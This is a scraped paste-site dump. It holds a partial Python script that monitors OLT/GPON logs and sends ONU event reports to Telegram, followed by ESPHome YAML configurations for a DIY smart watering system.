    if not os.path.exists(LAST_ACTIVATION_FILE):
        return True
    try:
        with open(LAST_ACTIVATION_FILE, 'r') as f:
            last_time = float(f.read().strip())
        return (time.time() - last_time) > 300  # 5 хвилин
    except Exception as e:
        logging.error(f""Помилка читання {LAST_ACTIVATION_FILE}: {e}"")
        return True

# Зберігаємо час активації
def save_activation_time():
    try:
        with open(LAST_ACTIVATION_FILE, 'w') as f:
            f.write(str(time.time()))
    except Exception as e:
        logging.error(f""Помилка збереження {LAST_ACTIVATION_FILE}: {e}"")

# Відправка повідомлення в Telegram
def send_telegram(msg, sent_messages):
    if msg in sent_messages:
        logging.warning(f""Повідомлення вже відправлено, пропущено: {msg}"")
        return
    url = f""https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage""
    for chat_id in TELEGRAM_CHAT_IDS:
        try:
            response = requests.post(url, data={""chat_id"": chat_id.strip(), ""text"": msg}, timeout=10)
            response.raise_for_status()
            logging.info(f""Повідомлення успішно відправлено в Telegram (chat_id: {chat_id}): {msg}"")
            save_sent_message(msg, sent_messages)
        except requests.RequestException as e:
            error_msg = f""Помилка відправки в Telegram для chat_id {chat_id}: {e}, response: {response.text if 'response' in locals() else 'немає відповіді'}""
            logging.error(error_msg)
            critical_msg = f""⚠️ Критична помилка в olt_monitor.py:\n{error_msg}""
            if critical_msg not in sent_messages:
                try:
                    for critical_chat_id in TELEGRAM_CHAT_IDS:
                        requests.post(url, data={""chat_id"": critical_chat_id.strip(), ""text"": critical_msg}, timeout=10)
                    save_sent_message(critical_msg, sent_messages)
                except Exception as critical_e:
                    logging.error(f""Не вдалося відправити критичну помилку в Telegram: {critical_e}"")

# Відправка звіту про події LAN у Telegram (з очищенням lan_events.log)
def send_lan_summary_to_telegram(sent_messages):
    logging.info(""Початок створення звіту про події LAN"")
    summary = defaultdict(lambda: {'los': 0, 'restore': 0})
    today = str(date.today())

    try:
        if not os.path.exists(LAN_EVENTS_LOG):
            logging.info(f""Файл {LAN_EVENTS_LOG} не існує"")
        else:
            with open(LAN_EVENTS_LOG, 'r', encoding='utf-8') as f:
                lines_processed = 0
                current_entry = []
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    # Начало новой записи определяется по временной метке (YYYY-MM-DD HH:MM:SS, с опциональными миллисекундами)
                    if re.match(r""\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}(?:,\d+)?"", line):
                        if current_entry:  # Обрабатываем предыдущую запись
                            lines_processed += 1
                            entry_text = '\n'.join(current_entry)
                            logging.debug(f""Обробка запису у {LAN_EVENTS_LOG}: {entry_text}"")
                            # Извлекаем порт, OLT и номер ONU
                            port_match = re.search(r""Порт: (gpon-onu_\d+/\d+/\d+(?::\d+)?)"", entry_text)
                            olt_match = re.search(r""OLT: (\S+) \((\d+\.\d+\.\d+\.\d+)\)"", entry_text)
                            onu_match = re.search(r""ONU №(\d+)"", entry_text)
                            if port_match and olt_match and onu_match:
                                port = port_match.group(1)
                                olt_name = olt_match.group(1)
                                olt_ip = olt_match.group(2)
                                onu_number = onu_match.group(1)
                                key = (port, olt_name, olt_ip, onu_number)
                                if ""LAN LOS знайдено"" in entry_text:
                                    summary[key]['los'] += 1
                                    logging.debug(f""Знайдено LAN LOS для {key} у {LAN_EVENTS_LOG}"")
                                elif ""LAN LOS Restore знайдено"" in entry_text:
                                    summary[key]['restore'] += 1
                                    logging.debug(f""Знайдено LAN LOS Restore для {key} у {LAN_EVENTS_LOG}"")
                            else:
                                logging.debug(f""Запис не відповідає формату port/olt/onu: {entry_text}"")
                            current_entry = []
                        current_entry.append(line)
                    else:
                        current_entry.append(line)

                # Обработка последней записи
                if current_entry:
                    lines_processed += 1
                    entry_text = '\n'.join(current_entry)
                    logging.debug(f""Обробка останнього запису у {LAN_EVENTS_LOG}: {entry_text}"")
                    port_match = re.search(r""Порт: (gpon-onu_\d+/\d+/\d+(?::\d+)?)"", entry_text)
                    olt_match = re.search(r""OLT: (\S+) \((\d+\.\d+\.\d+\.\d+)\)"", entry_text)
                    onu_match = re.search(r""ONU №(\d+)"", entry_text)
                    if port_match and olt_match and onu_match:
                        port = port_match.group(1)
                        olt_name = olt_match.group(1)
                        olt_ip = olt_match.group(2)
                        onu_number = onu_match.group(1)
                        key = (port, olt_name, olt_ip, onu_number)
                        if ""LAN LOS знайдено"" in entry_text:
                            summary[key]['los'] += 1
                            logging.debug(f""Знайдено LAN LOS для {key} у {LAN_EVENTS_LOG}"")
                        elif ""LAN LOS Restore знайдено"" in entry_text:
                            summary[key]['restore'] += 1
                            logging.debug(f""Знайдено LAN LOS Restore для {key} у {LAN_EVENTS_LOG}"")
                    else:
                        logging.debug(f""Останній запис не відповідає формату: {entry_text}"")

                logging.info(f""Оброблено {lines_processed} записів у {LAN_EVENTS_LOG}"")

        # Формирование отчета
        if summary:
            msg = f""📊 Звіт подій LAN за {today}:\n\n""
            for (port, olt_name, olt_ip, onu_number), counts in sorted(summary.items()):
                total = counts['los'] + counts['restore']
                msg += (
                    f""🔢 ONU №{onu_number}\n""
                    f""📍 Порт: {port}\n""
                    f""🖥 OLT: {olt_name} ({olt_ip})\n""
                    f""🔴 Втрата LAN: {counts['los']}\n""
                    f""🟢 LAN відновлено: {counts['restore']}\n""
                    f""🔢 Загалом: {total}\n\n""
                )
        else:
            msg = f""📊 Звіт подій LAN за {today}:\n\n⚠️ Подій LAN LOS або Restore не знайдено""

        send_telegram(msg.strip(), sent_messages)
        logging.info(""Звіт про події LAN відправлено в Telegram"")

        # Очищаем lan_events.log после отправки
        try:
            with open(LAN_EVENTS_LOG, 'w', encoding='utf-8') as f:
                f.write('')
            logging.info(f""Файл {LAN_EVENTS_LOG} очищено після відправки звіту"")
        except Exception as e:
            logging.error(f""Помилка очищення {LAN_EVENTS_LOG}: {e}"")

    except Exception as e:
        logging.error(f""Помилка створення звіту LAN: {e}"")

# Ручна перевірка звіту без очищення lan_events.log
def manual_lan_summary():
    sent_messages = load_sent_messages()
    logging.info(""Початок ручної перевірки звіту про події LAN"")
    summary = defaultdict(lambda: {'los': 0, 'restore': 0})
    today = str(date.today())

    try:
        if not os.path.exists(LAN_EVENTS_LOG):
            logging.info(f""Файл {LAN_EVENTS_LOG} не існує"")
        else:
            with open(LAN_EVENTS_LOG, 'r', encoding='utf-8') as f:
                lines_processed = 0
                current_entry = []
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    # Начало новой записи определяется по временной метке
                    if re.match(r""\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}(?:,\d+)?"", line):
                        if current_entry:  # Обрабатываем предыдущую запись
                            lines_processed += 1
                            entry_text = '\n'.join(current_entry)
                            logging.debug(f""Обробка запису у {LAN_EVENTS_LOG}: {entry_text}"")
                            port_match = re.search(r""Порт: (gpon-onu_\d+/\d+/\d+(?::\d+)?)"", entry_text)
                            olt_match = re.search(r""OLT: (\S+) \((\d+\.\d+\.\d+\.\d+)\)"", entry_text)
                            onu_match = re.search(r""ONU №(\d+)"", entry_text)
                            if port_match and olt_match and onu_match:
                                port = port_match.group(1)
                                olt_name = olt_match.group(1)
                                olt_ip = olt_match.group(2)
                                onu_number = onu_match.group(1)
                                key = (port, olt_name, olt_ip, onu_number)
                                if ""LAN LOS знайдено"" in entry_text:
                                    summary[key]['los'] += 1
                                    logging.debug(f""Знайдено LAN LOS для {key} у {LAN_EVENTS_LOG}"")
                                elif ""LAN LOS Restore знайдено"" in entry_text:
                                    summary[key]['restore'] += 1
                                    logging.debug(f""Знайдено LAN LOS Restore для {key} у {LAN_EVENTS_LOG}"")
                            else:
                                logging.debug(f""Запис не відповідає формату port/olt/onu: {entry_text}"")
                            current_entry = []
                        current_entry.append(line)
                    else:
                        current_entry.append(line)

                # Обработка последней записи
                if current_entry:
                    lines_processed += 1
                    entry_text = '\n'.join(current_entry)
                    logging.debug(f""Обробка останнього запису у {LAN_EVENTS_LOG}: {entry_text}"")
                    port_match = re.search(r""Порт: (gpon-onu_\d+/\d+/\d+(?::\d+)?)"", entry_text)
                    olt_match = re.search(r""OLT: (\S+) \((\d+\.\d+\.\d+\.\d+)\)"", entry_text)
                    onu_match = re.search(r""ONU №(\d+)"", entry_text)
                    if port_match and olt_match and onu_match:
                        port = port_match.group(1)
                        olt_name = olt_match.group(1)
                        olt_ip = olt_match.group(2)
                        onu_number = onu_match.group(1)
                        key = (port, olt_name, olt_ip, onu_number)
                        if ""LAN LOS знайдено"" in entry_text:
                            summary[key]['los'] += 1
                            logging.debug(f""Знайдено LAN LOS для {key} у {LAN_EVENTS_LOG}"")
                        elif ""LAN LOS Restore знайдено"" in entry_text:
                            summary[key]['restore'] += 1
                            logging.debug(f""Знайдено LAN LOS Restore для {key} у {LAN_EVENTS_LOG}"")
                    else:
                        logging.debug(f""Останній запис не відповідає формату: {entry_text}"")

                logging.info(f""Оброблено {lines_processed} записів у {LAN_EVENTS_LOG}"")

        # Формирование отчета
        if summary:
            msg = f""📊 Ручний звіт подій LAN за {today}:\n\n""
            for (port, olt_name, olt_ip, onu_number), counts in sorted(summary.items()):
                total = counts['los'] + counts['restore']
                msg += (
                    f""🔢 ONU №{onu_number}\n""
                    f""📍 Порт: {port}\n""
                    f""🖥 OLT: {olt_name} ({olt_ip})\n""
                    f""🔴 Втрата LAN: {counts['los']}\n""
                    f""🟢 LAN відновлено: {counts['restore']}\n""
                    f""🔢 Загалом: {total}\n\n""
                )
        else:
            msg = f""📊 Ручний звіт подій LAN за {today}:\n\n⚠️ Подій LAN LOS або Restore не знайдено""

        send_telegram(msg.strip(), sent_messages)
        logging.info(""Ручний звіт про події LAN відправлено в Telegram"")

    except Exception as e:
        logging.error(f""Помилка створення ручного звіту LAN: {e}"")

# Налаштування логування та перезапису файлів
def setup_logging_and_messages():
    try:
        logging.info(""Початок налаштування логування"")
        last_reset_date = None
        if os.path.exists(LAST_RESET_FILE):
            with open(LAST_RESET_FILE, 'r') as f:
                last_reset_date = f.read().strip()
            logging.info(f""Прочитано дату останнього перезапису: {last_reset_date}"")
        else:
            logging.info(f""Файл {LAST_RESET_FILE} не існує, буде створено"")
        today = str(date.today())
        logging.info(f""Поточна дата: {today}"")

        # Перевірка розміру логу
        log_size_mb = os.path.getsize(LOG_FILE_PATH) / (1024 * 1024) if os.path.exists(LOG_FILE_PATH) else 0
        logging.info(""Розмір логу: "" + str(round(log_size_mb, 2)) + "" МБ"")

        if last_reset_date != today:
            sent_messages = load_sent_messages()
            try:
                logging.basicConfig(
                    filename=LOG_FILE_PATH,
                    level=logging.INFO,
                    format='%(asctime)s [%(levelname)s] %(message)s',
                    filemode='w',
                    force=True
                )
                logging.info(f""Лог перезаписано для нової доби (size={log_size_mb:.2f} МБ)"")
                with open(SENT_MESSAGES_FILE, 'w', encoding='utf-8') as f:
                    f.write('')
                logging.info(""Файл sent_messages.txt перезаписано для нової доби"")
                with open(LAST_RESET_FILE, 'w') as f:
                    f.write(today)
                logging.info(f""Оновлено {LAST_RESET_FILE} з датою {today}"")
            except Exception as e:
                logging.error(f""Помилка при перезаписі файлів: {e}"")
                raise
        else:
            logging.basicConfig(
                filename=LOG_FILE_PATH,
                level=logging.INFO,
                format='%(asctime)s [%(levelname)s] %(message)s',
                filemode='a',
                force=True
            )
            logging.info(""Дата не змінилася, використовується режим додавання"")
    except Exception as e:
        logging.error(f""Критична помилка налаштування: {e}"")
        print(f""Критична помилка налаштування: {e}"")
        raise

# Перевірка розміру файлів
def check_file_size(file_path, file_name, max_size_mb=10):
    try:
        if os.path.exists(file_path):
            size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if size_mb > max_size_mb:
                current_time = time.time()
                last_warning_time = last_size_warning.get(file_name, 0)
                if current_time - last_warning_time > 600:
                    logging.warning(f""Розмір {file_name} перевищує {max_size_mb} МБ: {size_mb:.2f} МБ"")
                    last_size_warning[file_name] = current_time
    except Exception as e:
        logging.error(f""Помилка перевірки розміру {file_name}: {e}"")

# Глобальні змінні
current_interface = None
current_olt_name = None
current_olt_ip = None
current_description = None
onu_add_buffer = defaultdict(dict)

# Завантажуємо останню позицію
def load_last_position():
    if not os.path.exists(LAST_POSITION_FILE):
        return 0, os.stat(LOG_FILE).st_ino if os.path.exists(LOG_FILE) else 0
    try:
        with open(LAST_POSITION_FILE, 'r') as f:
            pos = f.read().strip()
            if pos == '':
                return 0, os.stat(LOG_FILE).st_ino
            return int(pos), os.stat(LOG_FILE).st_ino
    except Exception as e:
        logging.error(f""Помилка читання позиції з {LAST_POSITION_FILE}: {e}"")
        return 0, os.stat(LOG_FILE).st_ino if os.path.exists(LOG_FILE) else 0

# Зберігаємо останню позицію
def save_last_position(position):
    try:
        with open(LAST_POSITION_FILE, 'w') as f:
            f.write(str(position))
    except Exception as e:
        logging.error(f""Помилка збереження позиції в {LAST_POSITION_FILE}: {e}"")

# Парсинг логу
def parse_log(file_obj, start_pos, sent_messages):
    global current_interface, current_olt_name, current_olt_ip, current_description
    try:
        file_obj.seek(start_pos)
        file_size = os.path.getsize(LOG_FILE)
        if start_pos > file_size:
            logging.warning(f""start_pos ({start_pos}) більше file_size ({file_size}), скидаємо на 0"")
            start_pos = 0
            file_obj.seek(0)
        lines = file_obj.readlines()
        end_pos = file_obj.tell()
    except Exception as e:
        logging.error(f""Помилка читання файлу логу: {e}"")
        return start_pos

    for line in lines:
        line = line.strip().replace('#012', '').replace('#015', '')
        if not line:
            continue

        # Витягуємо ім'я та IP OLT
        m_olt = re.search(r""\[(\S+) (\d+\.\d+\.\d+\.\d+)\]"", line)
        if m_olt:
            current_olt_name = m_olt.group(1)
            current_olt_ip = m_olt.group(2)

        # Витягуємо час
        time_match = re.match(r""^\w+\s+\d+\s+(\d{2}:\d{2}:\d{2})"", line)
        time_str = time_match.group(1) if time_match else datetime.now().strftime(""%H:%M:%S"")
        try:
            event_time = datetime.strptime(time_str, ""%H:%M:%S"")
            event_time = event_time.replace(year=datetime.now().year, month=datetime.now().month, day=datetime.now().day)
        except ValueError as e:
            logging.error(f""Помилка формату часу {time_str}: {e}"")
            continue

        # Перевіряємо OLT перед обробкою подій
        if not current_olt_name or not current_olt_ip:
            logging.warning(f""Пропущено подію через відсутність OLT: {line}"")
            continue

        # Витягуємо інтерфейс
        m_intf = re.search(r""(?:interface\s+)(gpon-olt_\d+/\d+/\d+|gpon-onu_\d+/\d+/\d+:\d+)"", line, re.IGNORECASE)
        if m_intf:
            current_interface = m_intf.group(1)
            continue

        # Витягуємо description
        m_desc = re.search(r""description\s+(\S+)"", line, re.IGNORECASE)
        if m_desc:
            current_description = m_desc.group(1)
            for key, data in list(onu_add_buffer.items()):
                if key[2] == current_interface or key[2].replace(""gpon-olt_"", ""gpon-onu_"") + f"":{key[3]}"" == current_interface:
                    data['description'] = current_description
                    desc_str = f""\n🏷 Опис: {data['description']}"" if data['description'] else """"
                    msg = (
                        f""✅ ONU додано\n\n""
                        f""🕒 Час: {data['time_str']}\n""
                        f""🔢 ONU №{data['onu_number']}\n""
                        f""📍 Порт: {data['onu_iface']}{desc_str}\n""
                        f""🖥 OLT: {key[0]} ({key[1]})""
                    )
                    send_telegram(msg, sent_messages)
                    del onu_add_buffer[key]
            continue

        # LAN LOS Alarm
        m_lan_los = re.search(r""(?:GponRm notify:.*)?<gpon-onu_\d+/\d+/\d+:\d+>\s*SubType:\d+\s*Pos:\d+\s*ONU Uni lan los\. alarm"", line, re.IGNORECASE)
        if m_lan_los:
            m_iface_num = re.search(r""<(gpon-onu_\d+/\d+/\d+):(\d+)>"", line)
            if m_iface_num:
                onu_iface = m_iface_num.group(1)
                onu_num = m_iface_num.group(2)
                desc_str = f""\n🏷 Опис: {current_description}"" if current_description and current_interface == onu_iface else """"
                msg = (
                    f""🔴 Втрата LAN-з'єднання\n\n""
                    f""🕒 Час: {time_str}\n""
                    f""🔢 ONU №{onu_num}\n""
                    f""📍 Порт: {onu_iface}{desc_str}\n""
                    f""🖥 OLT: {current_olt_name} ({current_olt_ip})""
                )
                lan_logger.warning(f""LAN LOS знайдено: {msg}"")  # Записываем только в lan_events.log
                current_description = None
            continue

        # LAN LOS Restore
        m_lan_restore = re.search(r""(?:GponRm notify:.*)?<gpon-onu_\d+/\d+/\d+:\d+>\s*SubType:\d+\s*Pos:\d+\s*ONU Uni lan los\. restore"", line, re.IGNORECASE)
        if m_lan_restore:
            m_iface_num = re.search(r""<(gpon-onu_\d+/\d+/\d+):(\d+)>"", line)
            if m_iface_num:
                onu_iface = m_iface_num.group(1)
                onu_num = m_iface_num.group(2)
                desc_str = f""\n🏷 Опис: {current_description}"" if current_description and current_interface == onu_iface else """"
                msg = (
                    f""🟢 LAN-з'єднання відновлено\n\n""
                    f""🕒 Час: {time_str}\n""
                    f""🔢 ONU №{onu_num}\n""
                    f""📍 Порт: {onu_iface}{desc_str}\n""
                    f""🖥 OLT: {current_olt_name} ({current_olt_ip})""
                )
                lan_logger.warning(f""LAN LOS Restore знайдено: {msg}"")  # Записываем только в lan_events.log
                current_description = None
            continue

        # Видалення ONU
        m_no_onu = re.search(r""\b(?:no\s+onu|ont delete)\s+(\d+)(?:\s+\d+)?|ont delete\s+(\d+/\d+/\d+)\s+(\d+)"", line, re.IGNORECASE)
        if m_no_onu:
            onu_iface = m_no_onu.group(2) or current_interface or ""невідомий""
            onu_number = m_no_onu.group(1) or m_no_onu.group(3)
            desc_str = f""\n🏷 Опис: {current_description}"" if current_description and current_interface == onu_iface else """"
            msg = (
                f""❌ ONU видалено\n\n""
                f""🕒 Час: {time_str}\n""
                f""🔢 ONU №{onu_number}\n""
                f""📍 Порт: {onu_iface}{desc_str}\n""
                f""🖥 OLT: {current_olt_name} ({current_olt_ip})""
            )
            send_telegram(msg, sent_messages)
            current_description = None
            key = (current_olt_name, current_olt_ip, onu_iface, onu_number)
            if key in onu_add_buffer:
                del onu_add_buffer[key]
            continue

        # Додавання ONU
        m_add_onu = re.search(r""\b(?:onu\s+add|ont add)\s+(\d+)\s+(\d+)|ont add\s+(\d+/\d+/\d+)\s+(\d+)|onu\s+(\d+)\s+type\s+\S+\s+sn\s+\S+"", line, re.IGNORECASE)
        if m_add_onu:
            onu_iface = m_add_onu.group(1) or m_add_onu.group(3) or current_interface or ""невідомий""
            onu_number = m_add_onu.group(2) or m_add_onu.group(4) or m_add_onu.group(5)
            key = (current_olt_name, current_olt_ip, onu_iface, onu_number)
            onu_add_buffer[key] = {
                'time_str': time_str,
                'onu_iface': onu_iface,
                'onu_number': onu_number,
                'description': current_description if current_interface == onu_iface else None,
                'timestamp': datetime.now()
            }
            current_description = None
            continue

    # Обробка відкладених подій ONU
    current_time = datetime.now()
    for key, data in list(onu_add_buffer.items()):
        if (current_time - data['timestamp']).seconds >= 5:
            desc_str = f""\n🏷 Опис: {data['description']}"" if data['description'] else """"
            msg = (
                f""✅ ONU додано\n\n""
                f""🕒 Час: {data['time_str']}\n""
                f""🔢 ONU №{data['onu_number']}\n""
                f""📍 Порт: {data['onu_iface']}{desc_str}\n""
                f""🖥 OLT: {key[0]} ({key[1]})""
            )
            send_telegram(msg, sent_messages)
            del onu_add_buffer[key]

    return end_pos

# Моніторинг логу
def monitor_log():
    sent_messages = load_sent_messages()
    if can_send_activation():
        test_msg = f""🔔 Моніторинг OLT активовано\n\n🕒 Час: {datetime.now().strftime('%H:%M:%S')}""
        send_telegram(test_msg, sent_messages)
        save_activation_time()
    last_pos, last_inode = load_last_position()

    while True:
        try:
            check_file_size(LOG_FILE_PATH, ""olt_monitor.log"", max_size_mb=10)
            check_file_size(SENT_MESSAGES_FILE, ""sent_messages.txt"", max_size_mb=10)
            check_file_size(LAN_EVENTS_LOG, ""lan_events.log"", max_size_mb=10)
            if not os.path.exists(LOG_FILE):
                logging.error(f""Файл логу {LOG_FILE} не існує. Очікування 60 секунд"")
                time.sleep(60)
                continue
            current_inode = os.stat(LOG_FILE).st_ino
            if current_inode != last_inode:
                logging.info(f""Виявлено новий inode для {LOG_FILE}, скидання позиції"")
                last_pos, last_inode = 0, current_inode
            with open(LOG_FILE, ""r"", encoding=""utf-8"") as f:
                new_pos = parse_log(f, last_pos, sent_messages)
                if new_pos != last_pos:
                    save_last_position(new_pos)
                    last_pos = new_pos
            time.sleep(CHECK_INTERVAL)
        except Exception as e:
            logging.error(f""Критична помилка при обробці логу: {e}"")
            time.sleep(60)

# Планувальник для щоденного звіту
def run_scheduler():
    sent_messages = load_sent_messages()
    schedule.every().day.at(REPORT_TIME).do(send_lan_summary_to_telegram, sent_messages)
    while True:
        schedule.run_pending()
        time.sleep(60)

if __name__ == ""__main__"":
    try:
        setup_logging_and_messages()
        # Перевіряємо аргумент командного рядка
        if len(sys.argv) > 1 and sys.argv[1] == ""--manual-report"":
            manual_lan_summary()
        else:
            # Запускаємо планувальник у окремому потоці
            scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
            scheduler_thread.start()
            monitor_log()
    except Exception as e:
        logging.error(f""Помилка запуску програми: {e}"")
        raise
"
ECabTkfG,IP address configuration,gio_aggiustatutto,YAML,Sunday 8th of June 2025 02:31:21 AM CDT,"wifi:
  ssid: your_wifi_ssid
  password: your_wifi_password

  manual_ip:
    # Set this to the IP of the ESP
    static_ip: 192.168.1.253
    # Set this to the IP address of the router. Often ends with .1
    gateway: 192.168.1.1
    # The subnet of the network. 255.255.255.0 works for most home networks.
    subnet: 255.255.255.0"
njCSfB5z,Example code,gio_aggiustatutto,YAML,Sunday 8th of June 2025 02:28:33 AM CDT,"esphome:
  name: smart-watering-system
  friendly_name: Smart Watering System

esp32:
  board: esp32dev
  framework:
    type: arduino

# Enable logging
logger:

# Enable Home Assistant API
api:
  encryption:
    key: ""generated_automatically""

ota:
  - platform: esphome
    password: ""generated_automatically""

wifi:
  ssid: your_wifi_ssid
  password: your_wifi_password

  manual_ip:
    # Set this to the IP of the ESP
    static_ip: 192.168.1.253
    # Set this to the IP address of the router. Often ends with .1
    gateway: 192.168.1.1
    # The subnet of the network. 255.255.255.0 works for most home networks.
    subnet: 255.255.255.0

  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""Smart-Watering-System""
    password: ""generated_automatically""

captive_portal:

switch:
  - platform: gpio
    pin: GPIO16
    name: ""Water pump""
    id: water_pump
    on_turn_on: 
      then:
        - if:
            condition:
              - binary_sensor.is_on: water_level_ok
            then:
              - light.turn_on: blue_led
            else:
              - delay: 1s
              - switch.turn_off: water_pump       
    on_turn_off: 
      then:
        - if:
            condition:
              - binary_sensor.is_on: water_level_ok
            then:
              - light.turn_off: blue_led

button:
  - platform: template
    name: Start Watering
    id: button_start
    icon: ""mdi:power-on""
    on_press:
      then:
        - if:
            condition:
              - binary_sensor.is_on: water_level_ok
            then:
              - switch.turn_on: water_pump
              - delay: !lambda ""return id(watering_time).state*60*1000;""
              - switch.turn_off: water_pump
            else:
              - switch.turn_off: water_pump

  - platform: template
    name: Stop Watering
    id: button_stop
    icon: ""mdi:power-off""
    on_press:
      then:
        - switch.turn_off: water_pump
      

number:
  - platform: template
    name: Full Distance
    icon: mdi:arrow-collapse-vertical
    entity_category: config
    id: full_distance_m
    min_value: 0.01
    max_value: 1.50
    initial_value: 0.1
    optimistic: true
    step: 0.01
    restore_value: true
    unit_of_measurement: meters
    mode: box

  - platform: template
    name: Empty Distance
    icon: mdi:arrow-expand-vertical
    entity_category: config
    id: empty_distance_m
    min_value: 0.01
    max_value: 1.50
    initial_value: 0.1
    optimistic: true
    step: 0.01
    restore_value: true
    unit_of_measurement: meters
    mode: box

  - platform: template
    name: Safe Level Distance
    icon: mdi:arrow-expand-vertical
    entity_category: config
    id: safe_distance_m
    min_value: 0.01
    max_value: 1.50
    initial_value: 0.1
    optimistic: true
    step: 0.01
    restore_value: true
    unit_of_measurement: meters
    mode: box

  - platform: template
    name: Watering Time
    icon: mdi:clock-edit
    id: watering_time
    min_value: 1
    max_value: 60
    initial_value: 10
    optimistic: true
    step: 1
    restore_value: true
    unit_of_measurement: minutes
    mode: box

output:
  - platform: gpio
    pin: GPIO26
    id: red_led_output
  - platform: gpio
    pin: GPIO23
    id: yellow_led_1_output
  - platform: gpio
    pin: GPIO18
    id: yellow_led_2_output
  - platform: gpio
    pin: GPIO19
    id: green_led_output
  - platform: gpio
    pin: GPIO27
    id: blue_led_output

light:
  - platform: binary
    name: ""Red LED""
    id: red_led
    disabled_by_default: True
    output: red_led_output
    internal: False
    restore_mode: RESTORE_DEFAULT_OFF
    effects:
      - strobe:
          name: Blink
          colors:
            - state: true
              brightness: 100%
              duration: 500ms
            - state: false
              duration: 500ms
  - platform: binary
    name: ""Yellow LED 1""
    id: yellow_led_1
    disabled_by_default: True
    output: yellow_led_1_output
    restore_mode: RESTORE_DEFAULT_OFF
  - platform: binary
    name: ""Yellow LED 2""
    id: yellow_led_2
    disabled_by_default: True
    output: yellow_led_2_output
    restore_mode: RESTORE_DEFAULT_OFF
  - platform: binary
    name: ""Green LED""
    id: green_led
    disabled_by_default: True
    output: green_led_output
    restore_mode: RESTORE_DEFAULT_OFF
  - platform: binary
    name: ""Blue LED""
    id: blue_led
    disabled_by_default: True
    output: blue_led_output
    effects:
      - strobe:
          name: Double Blink
          colors:
            - state: true
              brightness: 100%
              duration: 150ms
            - state: false
              duration: 200ms
            - state: true
              brightness: 100%
              duration: 150ms
            - state: false
              duration: 500ms

binary_sensor:
  - platform: gpio
    pin:
      number: GPIO33
      mode:
        input: true
        pullup: true
      inverted: true
    name: ""Pushbutton""
    id: start_button
    filters:
      - delayed_on: 100ms
    on_press: 
      then:
        - if:
            condition:
              - switch.is_off: water_pump
            then:
              - button.press: button_start
              - delay: 1s
            else:
              - button.press: button_stop
              - delay: 1s
        

  - platform: template
    name: ""Water Level OK""
    id: water_level_ok
    lambda: |-
      if (id(ultrasonic_sensor_distance).state < id(safe_distance_m).state) {
        //there is enough water
        return true;
      } else {
        //there is not enough water
        return false;
      }
    on_state:
      then:
        - lambda: |-
            if (x == false) {
              id(blue_led).turn_on().set_effect(""Double Blink"").perform();
              id(water_pump).turn_off();
            } else {
              //do nothing
            }
    on_press: 
      then:
        - light.turn_off: blue_led
        
  - platform: template
    name: ""Pump Status""
    id: pump_status
    device_class: running
    lambda: |-
      return id(water_pump).state;

sensor:
  - platform: ultrasonic
    trigger_pin: GPIO22
    echo_pin: GPIO21
    name: ""Level Sensor Distance""
    id: ultrasonic_sensor_distance
    device_class: distance
    update_interval: 1s
    pulse_time: 10us
    timeout: 20m
    filters:
      - sliding_window_moving_average:
          window_size: 15
          send_every: 15

  - platform: template
    name: ""Water Level""
    id: water_level
    lambda: |-
        return id(ultrasonic_sensor_distance).state;
    update_interval: 1s
    accuracy_decimals: 0
    unit_of_measurement: ""%""
    filters:
      - lambda: return ((100 - 0)/(id(full_distance_m).state - id(empty_distance_m).state)) * x + (100 - (((100 - 0)/(id(full_distance_m).state - id(empty_distance_m).state)) * id(full_distance_m).state));
      - clamp:
          min_value: 0
          max_value: 100
          ignore_out_of_range: false
    on_value_range: 
      - below: 20
        then:
          - light.turn_off: green_led
          - light.turn_off: yellow_led_1
          - light.turn_off: yellow_led_2
          - light.turn_on:
              id: red_led
              effect: Blink          
      - above: 20
        then:
          - light.turn_on:
              id: red_led
              effect: None
      - below: 40
        then:
          - light.turn_off: green_led
          - light.turn_off: yellow_led_1
          - light.turn_off: yellow_led_2
      - above: 40
        then:
          - light.turn_on:
              id: red_led
              effect: None
          - light.turn_on: yellow_led_1
      - below: 60
        then:
          - light.turn_off: yellow_led_2
          - light.turn_off: green_led
      - above: 60
        then:
          - light.turn_on:
              id: red_led
              effect: None
          - light.turn_on: yellow_led_1
          - light.turn_on: yellow_led_2
      - below: 80
        then:
          - light.turn_off: green_led

      - above: 80
        then:
          - light.turn_on:
              id: red_led
              effect: None
          - light.turn_on: yellow_led_1
          - light.turn_on: yellow_led_2
          - light.turn_on: green_led"
cEcMSsnR,Code to be added below the one provided by ESPHome,gio_aggiustatutto,YAML,Sunday 8th of June 2025 02:24:48 AM CDT,"switch:
  - platform: gpio
    pin: GPIO16
    name: ""Water pump""
    id: water_pump
    on_turn_on: 
      then:
        - if:
            condition:
              - binary_sensor.is_on: water_level_ok
            then:
              - light.turn_on: blue_led
            else:
              - delay: 1s
              - switch.turn_off: water_pump       
    on_turn_off: 
      then:
        - if:
            condition:
              - binary_sensor.is_on: water_level_ok
            then:
              - light.turn_off: blue_led

button:
  - platform: template
    name: Start Watering
    id: button_start
    icon: ""mdi:power-on""
    on_press:
      then:
        - if:
            condition:
              - binary_sensor.is_on: water_level_ok
            then:
              - switch.turn_on: water_pump
              - delay: !lambda ""return id(watering_time).state*60*1000;""
              - switch.turn_off: water_pump
            else:
              - switch.turn_off: water_pump

  - platform: template
    name: Stop Watering
    id: button_stop
    icon: ""mdi:power-off""
    on_press:
      then:
        - switch.turn_off: water_pump
      

number:
  - platform: template
    name: Full Distance
    icon: mdi:arrow-collapse-vertical
    entity_category: config
    id: full_distance_m
    min_value: 0.01
    max_value: 1.50
    initial_value: 0.1
    optimistic: true
    step: 0.01
    restore_value: true
    unit_of_measurement: meters
    mode: box

  - platform: template
    name: Empty Distance
    icon: mdi:arrow-expand-vertical
    entity_category: config
    id: empty_distance_m
    min_value: 0.01
    max_value: 1.50
    initial_value: 0.1
    optimistic: true
    step: 0.01
    restore_value: true
    unit_of_measurement: meters
    mode: box

  - platform: template
    name: Safe Level Distance
    icon: mdi:arrow-expand-vertical
    entity_category: config
    id: safe_distance_m
    min_value: 0.01
    max_value: 1.50
    initial_value: 0.1
    optimistic: true
    step: 0.01
    restore_value: true
    unit_of_measurement: meters
    mode: box

  - platform: template
    name: Watering Time
    icon: mdi:clock-edit
    id: watering_time
    min_value: 1
    max_value: 60
    initial_value: 10
